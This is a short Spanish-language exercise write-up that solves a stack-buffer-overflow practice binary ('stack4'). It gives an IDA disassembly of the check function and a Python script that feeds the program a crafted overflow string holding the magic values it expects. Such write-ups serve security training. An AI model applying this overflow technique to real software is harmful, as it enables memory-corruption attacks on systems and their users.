@@ -1,0 +1,57 @@
+Stack4 by k0ch // 11 junio 2016
+
+Entorno: Windows 7 32bits
+
+En este caso analicé el stack4.idb con IDA PRO 6.8. Es bastante parecido a stack3, con la diferencia de que tenemos una llamada a función _check en el medio que nos obliga a escribir ciertos valores para pasar. 
+
+.text:00401455                 public _check
+.text:00401455 _check          proc near               ; CODE XREF: _main+5Dp
+.text:00401455
+.text:00401455 Code            = dword ptr -18h
+.text:00401455 arg_0           = dword ptr  8
+.text:00401455 arg_4           = dword ptr  0Ch
+.text:00401455 arg_8           = dword ptr  10h
+.text:00401455
+.text:00401455                 push    ebp
+.text:00401456                 mov     ebp, esp
+.text:00401458                 sub     esp, 18h
+.text:0040145B                 cmp     [ebp+arg_0], 71725553h <-- arg_0 corresponde a cookie (debemos sobreescribir este valor en cookie)
+.text:00401462                 jz      short loc_401470
+.text:00401464                 mov     [esp+18h+Code], 0 ; Code
+.text:0040146B                 call    _exit
+.text:00401470 ; ---------------------------------------------------------------------------
+.text:00401470
+.text:00401470 loc_401470:                             ; CODE XREF: _check+Dj
+.text:00401470                 cmp     [ebp+arg_4], 1020D0Ah <-- arg_4 tiene que tener un valor distinto a este (lo notamos con el jnz) por lo tanto con evitar pisarla, es suficiente
+.text:00401477                 jnz     short loc_401488
+.text:00401479                 inc     [ebp+arg_8]
+.text:0040147C                 mov     [esp+18h+Code], 0 ; Code
+.text:00401483                 call    _exit
+.text:00401488 ; ---------------------------------------------------------------------------
+.text:00401488
+.text:00401488 loc_401488:                             ; CODE XREF: _check+22j
+.text:00401488                 mov     eax, [ebp+arg_8] <-- debemos retornar el valor de var_4 para hacer que nos imprima "Win" en una comparación que está luego de salir de la función
+.text:0040148B                 leave
+.text:0040148C                 retn
+.text:0040148C _check          endp
+
+El script resultante es este:
+
+//---------------------
+
+import os
+
+StdIn,StdOut = os.popen4(r".\stack4.exe")
+
+XploitString = "x" * 50 + "\x53\x55\x72\x71" + "x" * 8 + "\x58\x41\x22\x35" + '\n'
+print XploitString
+
+StdIn.write(XploitString)
+StdIn.close()
+
+print StdOut.read()
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
